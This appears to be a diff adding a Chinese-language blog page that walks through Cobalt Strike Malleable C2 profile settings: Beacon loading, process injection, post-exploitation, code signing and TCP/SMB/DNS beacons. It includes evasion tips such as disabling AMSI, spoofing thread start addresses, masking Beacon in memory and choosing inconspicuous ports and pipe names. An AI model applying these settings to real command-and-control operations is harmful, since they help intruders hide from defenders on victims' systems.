r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\&#34;number\&#34;===t||\&#34;string\&#34;===t)&amp;&amp;!isNaN(e-parseFloat(e))},\&#34;function\&#34;==typeof define&amp;&amp;define.amd&amp;&amp;define(\&#34;jquery\&#34;,[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});&#34;;
+            print;
+        }
+    }
+}
+</code></pre><p>http-post为通过post请求发送的配置，与http-get类似</p>
+<h3 id="http-config">[http-config]</h3>
+<p>http-config代码块会影响Cobalt Strike所有HTTP响应</p>
+<p><img src="../index_files/image-20241207165126708.png" alt="image-20241207165126708"></p>
+<h3 id="stage">[stage]</h3>
+<p>stage块控制Beacon DLL如何加载到内存中并且可以修改Beacon DLL的内容</p>
+<p><img src="../index_files/image-20241207171951821.png" alt="image-20241207171951821"></p>
+<p>stage配置的相关配置如下</p>
+<table>
+  <thead>
+      <tr>
+          <th>配置</th>
+          <th>例子</th>
+          <th>描述</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>checksum</td>
+          <td>0</td>
+          <td>Beacon的PE头中的checksum字段</td>
+      </tr>
+      <tr>
+          <td>cleanup</td>
+          <td>false</td>
+          <td>尝试将反射DLL中的内存释放</td>
+      </tr>
+      <tr>
+          <td>compile_time</td>
+          <td>14 July 2009 8:14:00</td>
+          <td>Beacon的PE头中的编译时间信息</td>
+      </tr>
+      <tr>
+          <td>Beaconentry_point</td>
+          <td>92145</td>
+          <td>Beacon的PE头中的入口点信息</td>
+      </tr>
+      <tr>
+          <td>image_size_x64</td>
+          <td>512000</td>
+          <td>64位Beacon的PE头中的SizeOfImage字段</td>
+      </tr>
+      <tr>
+          <td>image_size_x86</td>
+          <td>512000</td>
+          <td>32位Beacon的PE头中的SizeOfImage字段</td>
+      </tr>
+      <tr>
+          <td>module_x64</td>
+          <td>xpsservices.dll</td>
+          <td>请求64位反射加载器通过VirtualAlloc方式覆盖空间加载特定的lib库</td>
+      </tr>
+      <tr>
+          <td>module_x86</td>
+          <td>xpsservices.dll</td>
+          <td>和x64类似，反射加载</td>
+      </tr>
+      <tr>
+          <td>name</td>
+          <td>beacon.x64.dll</td>
+          <td>Beacon DLL的导出名称</td>
+      </tr>
+      <tr>
+          <td>obfuscate</td>
+          <td>false</td>
+          <td>混淆反射DLL的导入表, 覆写未使用的头字段, 使反射加载器将不含DLL头信息的Beacon复制到新的内存地址.</td>
+      </tr>
+      <tr>
+          <td>rich_header</td>
+          <td></td>
+          <td>编译中加载的源数据</td>
+      </tr>
+      <tr>
+          <td>sleep_mask</td>
+          <td>false</td>
+          <td>在内存中对Beacon进行混淆，以便在sleep前执行</td>
+      </tr>
+      <tr>
+          <td>smartinject</td>
+          <td>false</td>
+          <td>使用嵌入式指针函数来引导Beacon Agent，而不是遍历kernel32的导出地址表</td>
+      </tr>
+      <tr>
+          <td>stomppe</td>
+          <td>true</td>
+          <td>在Beacon加载后，使用stomp技术覆盖MZ，PE头和e_lfanew的值</td>
+      </tr>
+      <tr>
+          <td>userwx</td>
+          <td>false</td>
+          <td>使反射加载器控制Beacon在内存中的RWX权限</td>
+      </tr>
+      <tr>
+          <td>allocator</td>
+          <td>VirtualAlloc</td>
+          <td>控制Beacon反射加载器初始化时使用的内存分配函数（VirtualAlloc，HeapAlloc，MapViewOfFile）默认使用VirtualAlloc函数</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="process-inject">[process-inject]</h3>
+<p>process-inject用于进程注入相关的内容进行配置，以控制注入相关的行为</p>
+<p><img src="../index_files/image-20241208102403092.png" alt="image-20241208102403092"></p>
+<p>有部分配置项和stage类似，老外的注释写的挺详细的，详细配置项如下：</p>
+<table>
+  <thead>
+      <tr>
+          <th>Option</th>
+          <th>Example</th>
+          <th>Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>allocator</td>
+          <td>VirtualAllocEx</td>
+          <td>在远程进程中分配内存的首选方法。可以指定使用 VirtualAllocEx 或 NtMapViewOfSection。NtMapViewOfSection 选项仅适用于相同架构的注入。VirtualAllocEx 始终用于跨架构的内存分配</td>
+      </tr>
+      <tr>
+          <td>min_alloc</td>
+          <td>4096</td>
+          <td>注入内容请求的最小内存量</td>
+      </tr>
+      <tr>
+          <td>startrwx</td>
+          <td>false</td>
+          <td>为注入内容使用 RWX 作为初始权限。另一种选择是 RW</td>
+      </tr>
+      <tr>
+          <td>userwx</td>
+          <td>false</td>
+          <td>将 RWX 作为注入内容的最终权限。另一种选择是 RX</td>
+      </tr>
+  </tbody>
+</table>
+<p>除了基础部分外，下面还包含一个execute配置子项，execute代码块控制Beacon在进程注入时要使用的方法。Beacon会检查execute代码块中的每个选项，确定该选项在当前环境中是否可用，在可用时尝试该方法。如果未执行代码，则移至下一个选项。</p>
+<p><img src="../index_files/image-20241208102948646.png" alt="image-20241208102948646"></p>
+<p>具体配置项如下：</p>
+<table>
+  <thead>
+      <tr>
+          <th>Option</th>
+          <th>x86 ‑&gt; x64</th>
+          <th>x64 ‑&gt; x86</th>
+          <th>Notes</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>CreateThread</td>
+          <td></td>
+          <td></td>
+          <td>仅适用当前Session</td>
+      </tr>
+      <tr>
+          <td>CreateRemoteThread</td>
+          <td></td>
+          <td>Yes</td>
+          <td>不适用跨平台session</td>
+      </tr>
+      <tr>
+          <td>NtQueueApcThread</td>
+          <td></td>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>NtQueueApcThread‑s</td>
+          <td></td>
+          <td></td>
+          <td>这是“Early Bird（APC队列代码注入技术，文章还在写&hellip;）”注入技术。仅适用于挂起的进程（如post-ex ）</td>
+      </tr>
+      <tr>
+          <td>RtlCreateUserThread</td>
+          <td>Yes</td>
+          <td>Yes</td>
+          <td>在 XP 的目标上风险较高；使用 RWX shellcode 进行 x86 到 x64 的注入</td>
+      </tr>
+      <tr>
+          <td>SetThreadContext</td>
+          <td></td>
+          <td>Yes</td>
+          <td>仅适用于挂起的进程（如post-ex ）</td>
+      </tr>
+  </tbody>
+</table>
+<p>CreateThread是专门针对自注入的，SetThreadContext和NtQueueApcThread-s选项和Beacon后渗透任务的临时进程相关。这些函数修改暂停进程的主线程来进行注入，NtQueueApcThread-s选项是Cobalt Strike对Early Bird代码注入技术的实现。</p>
+<p>NtQueueApcThread、RtlCreateUserThread和CreateRemoteThread是标准的进程注入选项，用于将代码注入到远程进程中</p>
+<p>此外CreateThread和CreateRemoteThread还具有线程起始地址欺骗功能，这对于绕过像Get-InjectedThread这样的技术很有用。使用方式[function] &ldquo;module!function+[地址偏移量]&rdquo;</p>
+<h3 id="post-ex">[post-ex]</h3>
+<p>post-ex是CS profile中关于后渗透的综合功能最强大的一个部分，以反射DLL的形式实现，CS会生成一个临时进程，并将功能注入其中。进程注入块控制进程注入步骤。post-ex代码块控制了CS中后渗透任务的具体内容和行为。</p>
+<p>在样例中可以看到光注释就写了一屏</p>
+<p><img src="../index_files/image-20241208104442515.png" alt="image-20241208104442515"></p>
+<p>默认配置项只有五条</p>
+<table>
+  <thead>
+      <tr>
+          <th>Option</th>
+          <th>Example</th>
+          <th>Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>spawnto_x86</td>
+          <td>%windir%\syswow64\rundll32.exe</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>spawnto_x64</td>
+          <td>%windir%\sysnative\rundll32.exe</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>obfuscate</td>
+          <td>false</td>
+          <td>混淆post-ex dll的内容，并在内存中以更安全的方式执行后渗透功能。这与 Beacon 的stage块中可用的混淆和 userwx 选项相似</td>
+      </tr>
+      <tr>
+          <td>smartinject</td>
+          <td>false</td>
+          <td>指示 Beacon 将关键函数指针（如 GetProcAddress 和 LoadLibrary）嵌入到同架构的post-ex DLL中。 这使 post-ex DLL可以在新进程中进行引导，而不会出现常规shellcode的行为，如使用PEB寻找kernel32.dll和其中的函数指针</td>
+      </tr>
+      <tr>
+          <td>amsi_disable</td>
+          <td>false</td>
+          <td>禁用amsi，指示 powerpick、execute-assembly 和 psinject 在加载 .NET 或 PowerShell 代码之前修补 AmsiScanBuffer 函数。这限制了反恶意软件扫描接口对这些功能的可见性</td>
+      </tr>
+  </tbody>
+</table>
+<p>其中给定了一些注意事项</p>
+<ul>
+<li>
+<p>spawnto 最多只能为 63 个字符</p>
+</li>
+<li>
+<p>二进制文件不会出现异常行为</p>
+</li>
+<li>
+<p>进程名不要指定为&quot;csrss.exe&rdquo;,&ldquo;logoff.exe&rdquo;,&ldquo;rdpinit.exe&rdquo;,&ldquo;bootim.exe&rdquo;,&ldquo;smss.exe&rdquo;,&ldquo;userinit.exe&rdquo;,&ldquo;sppsvc.exe&rdquo;</p>
+</li>
+<li>
+<p>二进制执行时不触发UAC</p>
+</li>
+<li>
+<p>可以使用以下选项来混淆</p>
+<pre tabindex="0"><code>set spawnto_x86 &#34;%windir%\\syswow64\\svchost.exe -k netsvcs&#34;;
+set spawnto_x64 &#34;%windir%\\sysnative\\svchost.exe -k netsvcs&#34;;
+注意：但是svchost作为父进程可能看起来不太正常
+</code></pre></li>
+</ul>
+<h3 id="code-signer">[code-signer]</h3>
+<p>除了SSL证书外，还有一个代码签名证书，该证书用于直接在生成马时打上签名，如果不带该参数时，生成exe文件时无法选中sign executable file选项</p>
+<p><img src="../index_files/image-20241207094112679.png" alt="image-20241207094112679"></p>
+<h3 id="参考keytool-生成证书链httpsyaphetszzgithubiopostskeytool生成证书链进行证书生成">参考<a href="https://yaphetszz.github.io/posts/keytool%E7%94%9F%E6%88%90%E8%AF%81%E4%B9%A6%E9%93%BE/">keytool 生成证书链</a>进行证书生成</h3>
+<p>在profile中配置code-signer字段</p>
+<pre tabindex="0"><code>code-signer {
+    set keystore &#34;keystore.jks&#34;;
+    set password &#34;password&#34;;
+    set alias &#34;server&#34;;
+}
+</code></pre><p>添加成功后执行c2lint检查配置文件正确性，如正确时输出如下，能成功识别到code-signer</p>
+<p><img src="../index_files/image-20241207114731350.png" alt="image-20241207114731350"></p>
+<p>此时签名功能已经可以使用</p>
+<p><img src="../index_files/image-20241207115303118.png" alt="image-20241207115303118"></p>
+<h3 id="tcp-beacon">[TCP Beacon]</h3>
+<p>该配置项用于设置TCP Beacon监听端口</p>
+<p><img src="../index_files/image-20241208111118481.png" alt="image-20241208111118481"></p>
+<p>默认端口为4444，强烈建议修改，其实4444,8888这些都比较容易被查，在这份模拟jquery的profile中使用的是42585，实际使用的时候建议也修改一下</p>
+<h3 id="smb-beacon">[SMB Beacon]</h3>
+<p>该配置项用于SMB Beacon的P2P通信</p>
+<p><img src="../index_files/image-20241208111438255.png" alt="image-20241208111438255"></p>
+<p>设置管道符名称就行，但是官方不建议使用已存在的管道名，因为Beacon不会检测冲突</p>
+<h3 id="dns-beacon">[DNS Beacon]</h3>
+<p>该选项用于配置DNS Beacon</p>
+<p><img src="../index_files/image-20241208111559816.png" alt="image-20241208111559816"></p>
+<table>
+  <thead>
+      <tr>
+          <th><strong>设置选项</strong></th>
+          <th>范围</th>
+          <th>默认值</th>
+          <th>说明</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>maxdns</td>
+          <td></td>
+          <td>255</td>
+          <td>通过DNS传输数据时的主机名最长值</td>
+      </tr>
+      <tr>
+          <td>dns_idle</td>
+          <td></td>
+          <td>0.0.0.0</td>
+          <td>DNS Beacon回连请求时，无任务默认返回值</td>
+      </tr>
+      <tr>
+          <td>dns_max_txt</td>
+          <td></td>
+          <td>252</td>
+          <td>Maximum length of DNS TXT responses for tasks</td>
+      </tr>
+      <tr>
+          <td>dns_sleep</td>
+          <td></td>
+          <td>0</td>
+          <td>Force a sleep prior to each individual DNS request. (in milliseconds)</td>
+      </tr>
+      <tr>
+          <td>dns_stager_prepend</td>
+          <td></td>
+          <td>.resources.123456.</td>
+          <td>Prepend text to payload stage delivered to DNS TXT record stager</td>
+      </tr>
+      <tr>
+          <td>dns_stager_subhost</td>
+          <td></td>
+          <td>.stage.123456.</td>
+          <td>Subdomain used by DNS TXT record stager.</td>
+      </tr>
+      <tr>
+          <td>dns_ttl</td>
+          <td></td>
+          <td>1</td>
+          <td>TTL for DNS replies</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="同时加载多重配置">同时加载多重配置</h2>
+<p>由于一个teamserver只允许加载一个Malleable C2 Profile，如果更改了Malleable C2可能会影响其他已上线设备，因此在编写Profile时可以考虑配置多重配置</p>
+<p>例如修改原profile中的http-get配置项，仅做示例使用，假装是个Vue</p>
+<p><img src="../index_files/image-20241208112628503.png" alt="image-20241208112628503"></p>
+<p>这时候重新加载Profile文件，在创建监听器时即可实现使用多种配置</p>
+<p><img src="../index_files/image-20241208112819121.png" alt="image-20241208112819121"></p>
+<h2 id="其他tips">其他Tips</h2>
+<ol>
+<li>
+<p>避免GET和POST名过长，否则可能导致发包和回包都巨慢</p>
+</li>
+<li>
+<p>C2Profile中的NamePipe最好选择与常规软件相近的NamePipe（比如Chrome）</p>
+</li>
+<li>
+<p>想到了再写</p>
+</li>
+</ol>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+
+  </article>
+
+    </main>
+  </body>
+</html>
